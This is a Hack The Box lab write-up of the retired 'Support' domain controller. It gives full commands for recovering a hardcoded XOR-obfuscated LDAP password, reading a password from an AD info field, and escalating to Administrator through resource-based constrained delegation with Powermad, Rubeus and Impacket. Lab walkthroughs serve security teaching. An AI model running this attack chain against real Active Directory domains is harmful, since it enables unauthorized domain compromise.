# HTB "Support" — Machine Writeup

> **Status:** Retired ✅ — published per [HTB's Content Sharing & Publication Guidelines](https://help.hackthebox.com/en/articles/12325897-platform-rules), which permit writeups only for retired machines, retired Sherlocks/challenges, Starting Point machines, and Tier 0 Academy modules.
> **Note on data below:** HTB flags and target IPs have been dynamic per-user/per-instance since March 2020 — the flag values, IP, and credentials in this writeup are specific to my own instance and will not match another user's spin-up of the same box.

**Author of machine:** 0xdf | **Difficulty:** Easy | **Domain:** support.htb
**Writeup by:** Dua-Ul-Iman

---

## Target Information

| Field | Value |
|---|---|
| Target IP | 10.129.68.128 |
| Hostname | dc.support.htb |
| Domain / Realm | support.htb / SUPPORT.HTB |
| NetBIOS Name | SUPPORT |
| Domain Mode | Windows2016Domain |
| Guessed OS | Windows Server 2016/2019/2022 (Domain Controller) |

---

## Vulnerability Summary

- An SMB share (`support-tools`) was open to anyone with no login at all, and someone left an internal admin tool sitting in it.
- That tool had a password baked into its code. It was "encrypted," but only in the loosest sense — a simple XOR cipher that falls apart the moment someone bothers to decompile the binary.
- That leaked password belonged to a service account, and that account could read a normal-looking user field (`info`) that someone had used for the real password. AD's `info` field is meant for notes, not secrets, but it's plaintext and readable by anyone who can bind to LDAP, so it gets misused for exactly this all the time.
- The real account this unlocked (`support`) turned out to have far more power than a helpdesk account should: it could create new computer accounts in the domain (a default AD privilege most people forget exists) and, more importantly, had write access to the Domain Controller's own object in Active Directory.
- That last point is the real vulnerability. Write access to a DC's delegation settings means any user who has it can point Kerberos delegation at a computer account they control, and once that's set up, Kerberos will hand over a ticket that lets us act as an Administrator against that DC.
- **Severity: Critical.** A completely unauthenticated attacker, given nothing but network access to the target, can walk from an open file share to full Domain Controller compromise. Every step is legitimate AD functionality being used the way it's designed to work — which is what makes RBCD (Resource-Based Constrained Delegation) abuse so effective.

---

## Tools Used, Briefly

| Tool | What it actually does |
|---|---|
| **Evil-WinRM** | Ruby-based WinRM client — basically SSH for Windows. With valid creds for an account in Remote Management Users, it drops into a real interactive PowerShell session. |
| **ldapsearch** | Queries AD over LDAP. Used here to turn a low-privilege service account's password into the real `support` user's password. |
| **Rubeus** | .NET tool for requesting, forging, and injecting Kerberos tickets. |
| **winrs** | Microsoft's native WinRM shell tool. Used as an alternative once Rubeus's ticket injection kept failing. |
| **Impacket** (`getST.py`, `smbclient.py`) | Python Kerberos toolkit. `getST.py` requested the same delegation ticket Rubeus was trying for, but built entirely on the Linux side — this is what actually worked. |
| **Powermad** | PowerShell toolkit for creating/manipulating fake computer accounts in AD. Its `New-MachineAccount` function created the attacker-controlled machine account the whole delegation trick depends on. |

---

## HTB Task Checklist

| # | Question | Answer / Status |
|---|---|---|
| 1 | How many shares is Support showing on SMB? | ADMIN$, C$, IPC$, NETLOGON, support-tools, SYSVOL |
| 2 | Which share is not a default share for a Windows DC? | support-tools |
| 3 | Which file in the share is not a publicly available tool? | UserInfo.exe (packaged as UserInfo.exe.zip) |
| 4 | Hardcoded LDAP password in the UserInfo.exe binary? | `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` |
| 5 | Which LDAP field for user `support` stands out as potentially holding a password? | `info` |
| 6 | Open port allowing Remote Management Users to get an interactive shell? | 5985/tcp (WinRM / PowerShell Remoting) |
| 8 | BloodHound privilege `support` has on the DC.SUPPORT.HTB object? | GenericAll |
| 9 | Attribute controlling how many computer accounts a user may create? | `ms-DS-MachineAccountQuota` |
| 10 | Impacket script to convert a Rubeus ticket to ccache format? | `ticketConverter.py` |
| 11 | Env variable to point Kerberos-aware tools (e.g. `psexec.py -k -no-pass`) at a ccache file? | `KRB5CCNAME` |

---

## Phase 1: Reconnaissance

### Nmap scan
```bash
nmap -A -sC -sV 10.129.68.128
```

### Open ports

| Port | Service | Notes |
|---|---|---|
| 53/tcp | domain (Simple DNS Plus) | DNS server, typical for a DC |
| 88/tcp | kerberos-sec | Kerberos auth — key for the S4U/RBCD path used later |
| 135/tcp | msrpc | RPC endpoint mapper |
| 139/tcp | netbios-ssn | Legacy SMB |
| 389/tcp | ldap | Directory queries against AD |
| 445/tcp | microsoft-ds | SMB — used for share access (support-tools, C$) |
| 464/tcp | kpasswd5 | Kerberos password change service |
| 593/tcp | ncacn_http | RPC over HTTP |
| 636/tcp | ldaps | LDAP over TLS |
| 3268/tcp | ldap (Global Catalog) | Forest-wide LDAP queries |
| 3269/tcp | ldaps (Global Catalog) | Global Catalog over TLS |
| 5985/tcp | http (WinRM) | PowerShell Remoting — used for the Evil-WinRM foothold shell |

---

## Phase 2: Enumeration & Foothold

### 1. Anonymous SMB access
An anonymous (null/guest) SMB session was allowed against a non-default share named `support-tools`, hosting internal utilities.

```bash
smbclient //10.129.68.128/support-tools -U ""
```

| Command | Purpose |
|---|---|
| `smbclient //<ip>/<share> -U ""` | Connects using a blank/anonymous username to find misconfigured guest access |
| `ls` | Lists files in the current SMB directory |

### 2. Downloading and extracting UserInfo.exe
```bash
get UserInfo.exe.zip
unzip UserInfo.exe.zip
```
UserInfo.exe is a .NET tool built to query Active Directory over LDAP.

### 3. Decompiling UserInfo.exe to recover the hardcoded LDAP password
```bash
strings UserInfo.exe      # confirms getPassword / enc_password / LdapQuery symbols exist
monodis UserInfo.exe > decompiled_code.txt
```

The decompiled IL for `UserInfo.Services.Protected.getPassword()` showed it base64-decoding a static field and XOR-decoding it with a repeating key:

```
IL_0000: ldstr "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"   // enc_password
IL_000f: ldstr "armando"                                            // XOR key
```

And `LdapQuery`'s constructor showed exactly how the password is used to bind:

```
IL_000d: ldstr "LDAP://support.htb"
IL_0012: ldstr "support\\ldap"     // bind DN: a dedicated 'ldap' service account
IL_0017: ldloc.0                   // the decoded password from getPassword()
```

Recovering the plaintext with the same XOR-then-XOR-0xDF logic seen in the IL:

```bash
python3 -c "import base64; enc='0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'; key=b'armando'; \
data=base64.b64decode(enc); print(''.join(chr(data[i] ^ key[i % len(key)] ^ 0xDF) for i in range(len(data))))"
```

**Result:** LDAP password for the `support\ldap` service account recovered.

### 4. Using the ldap service account to find the real support password
Anonymous LDAP binds were rejected ("a successful bind must be completed on the connection"). Binding as `support\ldap` with the recovered password worked and returned full attributes for the `support` user.

```bash
ldapsearch -x -H ldap://10.129.68.128 -D "ldap@support.htb" -w '<recovered_password>' \
  -b "DC=support,DC=htb" "(samAccountName=support)"
```

The `info` attribute is a free-text notes field in AD that's sometimes (mis)used to store credentials — exactly the case here. That value turned out to be the `support` user's real password.

### 5. Authenticating the foothold shell
```bash
evil-winrm -i 10.129.68.128 -u 'support' -p '<recovered_password>'
```

### 6. Domain enumeration from the foothold shell
```powershell
Get-ADDomain
whoami /groups
```
`whoami /groups` showed `support` is a member of **Shared Support Accounts** and **BUILTIN\Remote Management Users**.

---

## Phase 3: Setting Up RBCD (Resource-Based Constrained Delegation)

The actual privilege-escalation setup step: abusing write rights the `support` user holds over the DC computer object to configure delegation from an attacker-controlled fake computer account.

### 1. Uploading tools
```
upload Powermad.ps1
upload Rubeus.exe
```
> Evil-WinRM's `upload` initially failed with "Source file does not exist" — fixed by referencing the correct local working directory (`~/Desktop`) instead of a guessed absolute path.

### 2. Creating a fake computer account
```powershell
. .\Powermad.ps1
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
Get-ADComputer -identity FAKE-COMP01
```
This works because standard domain users are, by default, allowed to create a limited number of computer accounts (`ms-DS-MachineAccountQuota`).

### 3. Configuring delegation from the DC to the fake account
```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```
This single command is the actual privilege escalation — it writes to the DC computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, confirming the `support` user holds GenericWrite/GenericAll/WriteDacl-class rights over that object.

### 4. Getting a usable hash for the fake account
```powershell
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```
This RC4/NTLM hash feeds the S4U request that follows.

### Credentials & Accounts Used

| Account | Value | Source |
|---|---|---|
| `support\ldap` (service account) | Recovered from binary | Decompiled UserInfo.exe (monodis), reversed base64+XOR obfuscation |
| `support` (domain user) | Recovered from LDAP | Found in the `info` attribute of the `support` user's own LDAP object |
| `FAKE-COMP01$` (attacker-created machine account) | `Password123` / RC4 hash | Created via Powermad's `New-MachineAccount` using support's machine-account-creation rights |
| Administrator (impersonated) | No password/hash needed | Never compromised directly — impersonated via Kerberos S4U delegation abuse |

---

## Phase 4: Requesting the Delegated Ticket (on-target attempts — failed)

### 1. Failed direct file-share access
```
pushd \\dc.support.htb\c$
```
"Access is denied" — `support` has no direct access to C$.

### 2. Failed WMI-based remote execution
```
wmic /node:dc.support.htb /user:Administrator /password: process call create "cmd.exe /c whoami > C:\Users\Public\whoami.txt"
```
Blank password doesn't fall back to ticket-based auth.

### 3. Rubeus S4U request (run from the target, inside Evil-WinRM)
```powershell
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

| Flag | Purpose |
|---|---|
| `s4u` | Rubeus action driving the S4U2self + S4U2proxy request chain |
| `/user:FAKE-COMP01$` | The delegating machine account (already has RBCD configured) |
| `/rc4:<hash>` | NTLM hash of the machine account, used to request its own TGT |
| `/impersonateuser:Administrator` | Identity impersonated in the S4U2self step |
| `/msdsspn:cifs/dc.support.htb` | Target SPN for the S4U2proxy exchange |
| `/domain:support.htb` | Target Kerberos realm |
| `/ptt` | Pass-the-Ticket — fails on-target |

**Result:** TGT, S4U2self, and S4U2proxy all completed successfully at the KDC, but the final local injection failed:
```
[X] Error 1312 running LsaLookupAuthenticationPackage (ProtocalStatus): A specified logon session does not exist. It may already have been terminated
```

### Troubleshooting ticket injection on-target

Confirmed the delegation abuse itself worked (the KDC was issuing valid tickets) — the failures were all about getting a locally-restricted Evil-WinRM session to accept an injected ticket.

| Attempt | Command | Result |
|---|---|---|
| winrs w/ host SPN | `winrs -r:dc.support.htb whoami` | RemoteException — fails regardless of SPN targeted |
| Manual ptt import | `.\Rubeus.exe ptt /ticket:ticket.txt` | Same Error 1312 |
| createnetonly, simple command | `.\Rubeus.exe createnetonly /program:"whoami.exe" /ticket:ticket.txt` | SUCCESS |
| createnetonly + redirection | `.\Rubeus.exe createnetonly /program:"cmd.exe /c dir ... > out.txt" /ticket:ticket.txt` | CreateProcessWithLogonW error 123 — embedded `>` inside `/program` breaks argument parsing |

`createnetonly` confirmed the ticket was valid (LOGON_TYPE 9, real PID/LUID returned) as soon as `/program` was kept to a single bare executable. Evil-WinRM's PowerShell Remoting session is not a normal interactive logon, so LSA rejects direct ticket injection into it — same root cause behind both the Rubeus and `winrs`/`Enter-PSSession` failures.

---

## Phase 5: Solution — S4U From Kali (Impacket)

The same RBCD abuse, performed entirely from the attacking Kali box using Impacket — no restricted session to fight. This is the approach that ultimately worked.

### 1. Locate and request the ticket
```bash
python3 /usr/share/doc/python3-impacket/examples/getST.py \
  -spn cifs/dc.support.htb -impersonate Administrator \
  support.htb/'FAKE-COMP01$' -hashes :<NTLM hash> -dc-ip 10.129.68.128
```

| Flag | Purpose |
|---|---|
| `-spn cifs/dc.support.htb` | Target service ticket to request (SMB/file access on the DC) |
| `-impersonate Administrator` | User to impersonate via S4U2self |
| `support.htb/'FAKE-COMP01$'` | The delegating machine account and its domain |
| `-hashes :<NTLM>` | NTLM hash of the machine account (LM hash left blank) |
| `-dc-ip` | IP of the Domain Controller / KDC |

A ticket file (`Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache`) is saved locally.

### 2. Load the ticket and connect
```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
python3 /usr/share/doc/python3-impacket/examples/smbclient.py -k -no-pass \
  support.htb/administrator@dc.support.htb -dc-ip 10.129.68.128
```

| Component | Purpose |
|---|---|
| `export KRB5CCNAME=...` | Tells Kerberos-aware tools which ticket cache file to use |
| `-k` | Use Kerberos authentication instead of NTLM |
| `-no-pass` | Don't prompt for a password — rely entirely on the loaded ticket |

> Earlier attempts hit a clock-skew-sensitive NETBIOS timeout, resolved by syncing time with the DC first: `sudo ntpdate 10.129.68.128`

### 3. Retrieving the flag
```
use C$
cd Users\Administrator\Desktop
ls
get root.txt
```

---

## Flags

| Flag | Location | Value (instance-specific) |
|---|---|---|
| User flag | `C:\Users\support\Desktop\user.txt` | a4e40ce04647a69704d5dd9b102cc9bf |
| Root flag | `C:\Users\Administrator\Desktop\root.txt` | f551197cc422075f0ab63aeba56b41a3 |

---

## Errors Encountered

Every distinct error hit during this engagement, gathered in one place with cause and (where applicable) fix.

| Error | Where It Showed Up | Cause / Fix |
|---|---|---|
| Error 1312 — `LsaLookupAuthenticationPackage`: A specified logon session does not exist | `Rubeus s4u ... /ptt`, `Rubeus ptt /ticket:...` | Evil-WinRM's PowerShell Remoting session is not a normal interactive logon; LSA rejects direct ticket injection into it |
| WinRM error 0x8009030e — A specified logon session does not exist | `winrs -r:dc.support.htb whoami`, `Enter-PSSession -ComputerName dc.support.htb` | Same root cause as above — the double-hop / session-bound nature of WinRM prevents the ticket from being usable for a second hop to the DC |
| CreateProcessWithLogonW error: 2 (ERROR_FILE_NOT_FOUND) | `Rubeus createnetonly /program:"powershell.exe"` | Bare relative filenames aren't reliably resolved this way; fixed by supplying the full path (e.g. `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) |
| LDAP Operations error / "a successful bind must be completed on the connection" | Anonymous `ldapsearch` queries with no `-D`/`-w` | This DC does not permit anonymous LDAP queries — authentication is required before any search returns data |
| `rpcclient: NT_STATUS_ACCESS_DENIED` | `rpcclient -U "" -N 10.129.68.128` then `queryuser support` | Anonymous/null RPC session has no rights to query user objects on this DC |
| `upload: Source file does not exist` | Multiple upload attempts for Powermad.ps1 and Rubeus.exe | Evil-WinRM's `upload` resolves the local (Kali-side) path relative to the shell's actual working directory (`~/Desktop`), not a guessed absolute path |

---

## Key Takeaway

Every step of this chain used legitimate, by-design AD functionality — anonymous share access, machine account creation quotas, delegation write rights — chained together rather than any single "vulnerability" in the traditional sense. This is the core lesson of RBCD abuse: the danger isn't a bug, it's excessive default privileges compounding across a low-friction path from zero access to Domain Admin.
